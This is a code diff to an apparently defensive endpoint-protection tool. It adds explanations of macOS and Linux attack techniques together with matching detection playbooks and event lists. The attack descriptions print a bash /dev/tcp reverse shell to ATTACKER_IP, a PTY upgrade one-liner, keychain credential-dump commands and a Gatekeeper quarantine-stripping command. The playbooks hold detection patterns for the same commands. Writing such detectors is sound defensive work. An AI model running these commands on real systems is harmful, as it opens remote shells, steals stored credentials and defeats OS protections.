@@ -72,6 +72,69 @@ OFFENSIVE_CONTEXT = {
         "download dropper → establish persistence → scan subnet → repeat. Worms often carry secondary "
         "payloads (ransomware, cryptominer) activated after propagation phase."
     ),
+    # macOS-specific
+    'gatekeeper_bypass': (
+        "Gatekeeper is macOS's first-line application trust mechanism — it blocks unsigned or "
+        "unnotarised binaries from executing. The bypass via `xattr -d com.apple.quarantine` strips "
+        "the quarantine extended attribute that Gatekeeper reads on first launch. Attackers stage "
+        "malicious apps inside DMG images (bypassing quarantine entirely pre-macOS 13) or use "
+        "social engineering to trick users into running `xattr -r -d` via terminal instructions. "
+        "Post-bypass, the app runs with full user-level permissions — often immediately spawning "
+        "a LaunchAgent for persistence."
+    ),
+    'applescript_execution': (
+        "AppleScript (via `osascript`) has deep OS integration and can automate virtually any "
+        "GUI application, display fake password prompts, access the clipboard, take screenshots, "
+        "and send keystrokes to other apps. Attackers use it for UI phishing (display dialog to "
+        "steal the user's password), privilege escalation (do shell script with administrator "
+        "privileges), and persistence (adding login items). AppleScript is not sandboxed for "
+        "most operations, making it a potent LOLBin on macOS comparable to PowerShell on Windows."
+    ),
+    'keychain_access': (
+        "The macOS Keychain is the system's credential vault — it stores WiFi passwords, browser "
+        "credentials, application API keys, and private keys. The `security` binary provides CLI "
+        "access: `security find-generic-password -wa <service>` extracts a plaintext credential "
+        "without a GUI prompt if the calling process is in the keychain's ACL. Attackers inject "
+        "into trusted processes (e.g., legitimate apps already in the ACL) or abuse `dump-keychain -d` "
+        "to extract all credentials to disk. The full dump is often exfiltrated in a single HTTPS POST "
+        "disguised as analytics traffic."
+    ),
+    'persistence_mechanism': (
+        "LaunchAgents and LaunchDaemons are macOS's equivalent of Windows services and scheduled tasks. "
+        "Agents in ~/Library/LaunchAgents/ run as the user; Daemons in /Library/LaunchDaemons/ run as "
+        "root. A plist file with a Program key and RunAtLoad = true is all that's needed for "
+        "persistence across reboots. Attackers write minimal plists pointing to a hidden binary in "
+        "/tmp or ~/.hidden — `launchctl load` activates it immediately. The technique survives OS "
+        "upgrades and is invisible in Finder (files are dotfiles or placed in obscure paths)."
+    ),
+    # Linux-specific
+    'reverse_shell': (
+        "Bash's built-in /dev/tcp pseudo-device enables raw TCP connections without any network "
+        "utilities. `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` redirects stdin/stdout/stderr to "
+        "an attacker-controlled socket, creating a fully interactive shell. This is entirely "
+        "file-less — no binary is written to disk. Variants use Python, Perl, PHP, or Ruby one-liners "
+        "for the same effect. After gaining a reverse shell, attackers typically upgrade to a PTY "
+        "(`python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`) and then deploy a proper C2 implant."
+    ),
+    'ld_preload_injection': (
+        "LD_PRELOAD forces the dynamic linker to load a specified shared library before all others, "
+        "allowing function interposition on any dynamically-linked binary. Attackers use it to hook "
+        "`read()`, `write()`, `getpass()`, or PAM authentication functions to steal credentials "
+        "typed into the terminal or passed through SSH. A malicious .so set in LD_PRELOAD can also "
+        "hide files and processes (rootkit), intercept SSL/TLS before encryption (SSL stripping), "
+        "or inject code into every process launched by the compromised user. Unlike kernel rootkits, "
+        "LD_PRELOAD requires no privileges — any user-space process can be hijacked this way."
+    ),
+    'kernel_module_load': (
+        "Linux kernel modules (LKMs) run with ring-0 privilege — the highest privilege level, with "
+        "direct hardware access and the ability to modify any kernel data structure. A rootkit LKM "
+        "can hook the `sys_call_table` to intercept and modify any system call result, making "
+        "malicious processes, files, and network connections invisible to all user-space tools "
+        "(ps, ls, netstat). `insmod` loads a module immediately; `modprobe` resolves dependencies "
+        "first. Secure Boot with Module Signing prevents unsigned modules on modern systems — "
+        "attackers either exploit kernel vulnerabilities to bypass signing or target machines "
+        "where Secure Boot is disabled."
+    ),
 }
 
 DEFENSIVE_PLAYBOOK = {
@@ -127,10 +190,60 @@ DEFENSIVE_PLAYBOOK = {
     ),
     'backdoor': (
         "The antibody captures the persistence mechanism signature. The file watcher monitors "
-        "for DLL drops in application directories and registry key writes to Run/RunOnce. "
-        "The process monitor flags new services created outside of known installer contexts. "
-        "Future backdoor installations with similar telemetry patterns auto-match this antibody "
-        "and are quarantined before execution."
+        "for DLL drops in application directories, LaunchAgent/LaunchDaemon plist drops on macOS, "
+        "and cron/systemd service writes on Linux. The process monitor flags new services created "
+        "outside known installer contexts. Future backdoor installations with similar telemetry "
+        "patterns auto-match this antibody and are quarantined before execution."
+    ),
+    'gatekeeper_bypass': (
+        "The antibody captures the exact xattr quarantine-stripping command signature. The process "
+        "monitor now flags any `xattr -d com.apple.quarantine` invocation regardless of target path. "
+        "The file watcher also monitors /Applications and ~/Applications for new app bundles that "
+        "arrive without the quarantine attribute — a sign the file was delivered outside a browser "
+        "download, bypassing Gatekeeper at the source."
+    ),
+    'applescript_execution': (
+        "The antibody encodes the osascript invocation pattern. The process monitor flags osascript "
+        "calls with inline `-e` scripts, particularly those containing `display dialog`, `do shell "
+        "script`, or `keystroke` — the highest-abuse AppleScript commands. The vector similarity "
+        "search will catch renamed or obfuscated AppleScript launchers that share the same "
+        "behavioural profile as this confirmed attack."
+    ),
+    'keychain_access': (
+        "The antibody captures the `security dump-keychain` / `find-*-password` signature. Any "
+        "future invocation of the `security` binary with credential-extraction arguments will "
+        "immediately match this antibody and trigger process kill before the credentials reach "
+        "an attacker. The anomaly model also scores unexpected `security` invocations outside of "
+        "normal login flows as highly anomalous."
+    ),
+    'persistence_mechanism': (
+        "The antibody encodes the launchctl load + suspicious path signature. The file watcher now "
+        "monitors ~/Library/LaunchAgents/, /Library/LaunchAgents/, and /Library/LaunchDaemons/ for "
+        "new plist files. Any plist creation in these directories triggers an immediate severity-8 "
+        "alert. Combined with the process monitor watching for `launchctl load` from /tmp or /var/, "
+        "this antibody covers both the file drop and the activation step."
+    ),
+    'reverse_shell': (
+        "The antibody encodes the /dev/tcp bash redirection pattern. The process monitor scans "
+        "cmdline for `>& /dev/tcp/`, `/dev/tcp/`, and `exec /bin/sh` across all shell processes. "
+        "Python/Perl/Ruby reverse shell one-liners are caught by the high-risk process heuristic "
+        "on the interpreter names combined with network connection events from the same PID. "
+        "At severity 10 the process is killed immediately — there is no safe reason for a shell "
+        "to be redirecting its file descriptors to a TCP socket."
+    ),
+    'ld_preload_injection': (
+        "The antibody captures the LD_PRELOAD environment variable presence. The process monitor "
+        "reads every new process's environment (where permitted) and flags LD_PRELOAD unconditionally "
+        "— legitimate LD_PRELOAD usage is vanishingly rare in production. The vector index now "
+        "has a reference signature for this injection method; future processes with LD_PRELOAD set "
+        "score immediately above the anomaly threshold regardless of the loaded library's name."
+    ),
+    'kernel_module_load': (
+        "The antibody captures the insmod/modprobe invocation. The process monitor flags all "
+        "kernel module loads with severity 9 by default — this is an elevated-privilege operation "
+        "that should almost never occur at runtime outside of a controlled update window. The "
+        "anomaly model now treats kernel module loads as high-baseline anomalies. At severity ≥ 8, "
+        "the process is killed before the module can complete initialisation and hide itself."
     ),
     'worm': (
         "The antibody encodes the lateral movement signature: rapid outbound connection attempts "
@@ -157,9 +270,21 @@ def generate(threat: dict, antibody: dict, response_taken: list) -> dict:
             f"anomaly model flagged a score of {anomaly_score:.2f} — "
             f"{int(anomaly_score * 100)}% deviation from the established baseline"
         )
-    if telemetry.get('event') in ('mass_file_modification', 'ransomware_extension_detected',
-                                   'high_risk_process', 'wx_memory_region', 'beacon_pattern',
-                                   'suspicious_port_connection', 'resource_spike'):
+    HEURISTIC_EVENTS = {
+        'mass_file_modification', 'ransomware_extension_detected', 'high_risk_process',
+        'wx_memory_region', 'beacon_pattern', 'suspicious_port_connection', 'resource_spike',
+        # macOS
+        'gatekeeper_bypass', 'persistence_mechanism', 'applescript_execution',
+        'download_execute', 'keychain_access',
+        # Windows
+        'powershell_encoded', 'powershell_hidden', 'shadow_copy_deletion',
+        'lolbin_download', 'credential_dump_tool',
+        # Linux
+        'kernel_module_load', 'ld_preload_injection', 'reverse_shell', 'cron_modification',
+        # Cross-platform
+        'persistence_file_drop',
+    }
+    if telemetry.get('event') in HEURISTIC_EVENTS:
         detection_signals.append(
             f"zero-day heuristic matched on event type '{telemetry.get('event')}'"
         )
